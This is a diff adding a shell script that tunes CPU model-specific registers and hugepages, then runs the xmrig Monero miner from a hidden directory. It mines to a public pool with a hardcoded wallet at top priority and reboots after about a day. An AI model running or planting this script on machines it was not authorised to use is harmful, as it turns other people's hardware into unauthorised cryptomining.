@@ -1,0 +1,73 @@
+#!/bin/sh -e
+#msr
+MSR_FILE=/sys/module/msr/parameters/allow_writes
+
+if test -e "$MSR_FILE"; then
+	echo on > $MSR_FILE
+else
+	modprobe msr allow_writes=on
+fi
+
+if grep -E 'AMD Ryzen|AMD EPYC|AuthenticAMD' /proc/cpuinfo > /dev/null;
+	then
+	if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
+		then
+			if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
+				then
+					echo "Detected Zen4 CPU"
+					wrmsr -a 0xc0011020 0x4400000000000
+					wrmsr -a 0xc0011021 0x4000000000040
+					wrmsr -a 0xc0011022 0x8680000401570000
+					wrmsr -a 0xc001102b 0x2040cc10
+					echo "MSR register values for Zen4 applied"
+				else
+					echo "Detected Zen3 CPU"
+					wrmsr -a 0xc0011020 0x4480000000000
+					wrmsr -a 0xc0011021 0x1c000200000040
+					wrmsr -a 0xc0011022 0xc000000401570000
+					wrmsr -a 0xc001102b 0x2000cc10
+					echo "MSR register values for Zen3 applied"
+				fi
+		elif grep "cpu family[[:space:]]\{1,\}:[[:space:]]26" /proc/cpuinfo > /dev/null;
+			then
+				echo "Detected Zen5 CPU"
+				wrmsr -a 0xc0011020 0x4400000000000
+				wrmsr -a 0xc0011021 0x4000000000040
+				wrmsr -a 0xc0011022 0x8680000401570000
+				wrmsr -a 0xc001102b 0x2040cc10
+				echo "MSR register values for Zen5 applied"
+		else
+			echo "Detected Zen1/Zen2 CPU"
+			wrmsr -a 0xc0011020 0
+			wrmsr -a 0xc0011021 0x40
+			wrmsr -a 0xc0011022 0x1510000
+			wrmsr -a 0xc001102b 0x2000cc16
+			echo "MSR register values for Zen1/Zen2 applied"
+		fi
+elif grep "Intel" /proc/cpuinfo > /dev/null;
+	then
+		echo "Detected Intel CPU"
+		wrmsr -a 0x1a4 0xf
+		echo "MSR register values for Intel applied"
+else
+	echo "No supported CPU detected"
+fi
+
+#hugepage
+
+# https://xmrig.com/docs/miner/hugepages#onegb-huge-pages
+
+sysctl -w vm.nr_hugepages=4
+
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
+
+echo "1GB pages successfully enabled"
+
+#randomx
+
+nice -n -20 numactl --membind=0 --physcpubind=0,1,2,3 ./.xmrig/xmrig --cpu-priority -20 --cpu-affinity=0xF -av 4 -k -a rx -t 4 -o gulf.moneroocean.stream:10128 --log-file /var/log/xmrig.log --asm=intel --randomx-mode=fast -k -u 47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP.CentOStream --donate-level 0 --threads 8 
+sleep 84600
+reboot
